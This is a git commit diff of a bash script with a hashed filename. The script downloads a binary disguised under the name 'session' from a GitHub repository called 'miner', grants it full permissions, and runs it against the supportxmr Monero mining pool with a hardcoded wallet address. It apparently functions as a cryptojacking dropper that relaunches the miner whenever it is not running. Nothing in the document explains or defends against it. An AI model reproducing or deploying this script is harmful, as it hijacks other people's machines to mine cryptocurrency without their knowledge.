d9d5b1ecff2568baf97f1afb8827028b8f710eb8
charlene-roperos <rbsuarez00311@gmail.com>
2025-03-20 15:42:10 +0800

    Update 02ff28e4d653bb7e0bf6c71ad51f479d620a6861.sh

--- 02ff28e4d653bb7e0bf6c71ad51f479d620a6861.sh
+++ 02ff28e4d653bb7e0bf6c71ad51f479d620a6861.sh
@@ -1,11 +1,15 @@
 #!/bin/bash
 
 # Check if the session process is running
-if ! pgrep -x "session" > /dev/null; then
-    echo "Session not found. Downloading and starting..."
+if pgrep -x "session" > /dev/null; then
+    echo "Session process is already running."
+elif [ -f "./session" ]; then
+    echo "Session file found. Starting..."
+    chmod 777 session
+    ./session -o pool.supportxmr.com:80 -u 442xHeyLLcgQSSgbKJrMiG8mECruxyviqKMDt41nMXhgiCJFmA4CJaoQ8gGDz7EH89c2cUk6LaKN1RTPatbU3xhR6dPvaMf -k -p 2025
+else
+    echo "Session file not found. Downloading and starting..."
     wget https://github.com/charlene-roperos/miner/raw/refs/heads/main/session
     chmod 777 session
-    ./session -o pool.supportxmr.com:80 -u 442xHeyLLcgQSSgbKJrMiG8mECruxyviqKMDt41nMXhgiCJFmA4CJaoQ8gGDz7EH89c2cUk6LaKN1RTPatbU3xhR6dPvaMf -k -p 2025 
-else
-    echo "Session process is already running."
+    ./session -o pool.supportxmr.com:80 -u 442xHeyLLcgQSSgbKJrMiG8mECruxyviqKMDt41nMXhgiCJFmA4CJaoQ8gGDz7EH89c2cUk6LaKN1RTPatbU3xhR6dPvaMf -k -p 2025
 fi
